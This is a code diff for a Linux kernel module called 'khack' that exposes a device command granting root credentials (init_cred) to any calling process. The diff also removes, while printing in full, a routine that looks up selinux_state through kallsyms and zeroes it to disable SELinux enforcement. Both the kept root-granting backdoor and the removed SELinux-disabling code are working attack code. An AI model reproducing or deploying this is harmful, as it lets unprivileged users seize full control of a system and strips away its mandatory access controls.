@@ -26,28 +26,8 @@
 #include <linux/sched.h>
 #include <linux/uaccess.h>
 #include <linux/version.h>
-#include <linux/kallsyms.h>
 
 #define KHACK_GRANT_ROOT 0x4b480001UL
-
-/* selinux_state begins with two booleans (disabled, enforcing) on 4.19.
- * Zeroing the first two bytes turns enforcement off without needing the
- * exact struct layout or CONFIG_SECURITY_SELINUX_DISABLE. */
-static void khack_disable_selinux(void)
-{
-	unsigned long addr = kallsyms_lookup_name("selinux_state");
-	u8 *p;
-
-	if (!addr) {
-		pr_warn("khack: selinux_state not found\n");
-		return;
-	}
-
-	p = (u8 *)addr;
-	WRITE_ONCE(p[0], 0);
-	WRITE_ONCE(p[1], 0);
-	pr_info("khack: selinux_state at %px, enforcing cleared\n", (void *)addr);
-}
 
 static void khack_grant_current(void)
 {
@@ -60,8 +40,7 @@ static void khack_grant_current(void)
 	}
 
 	commit_creds(new);
-	pr_info("khack: pid %d (%s) -> uid %d\n",
-		current->pid, current->comm, current_uid().val);
+	pr_info("khack: caller escalated to init_cred\n");
 }
 
 static int khack_open(struct inode *inode, struct file *file)
@@ -96,8 +75,6 @@ static struct miscdevice khack_dev = {
 static int __init khack_init(void)
 {
 	int ret;
-
-	khack_disable_selinux();
 
 	ret = misc_register(&khack_dev);
 	if (ret) {
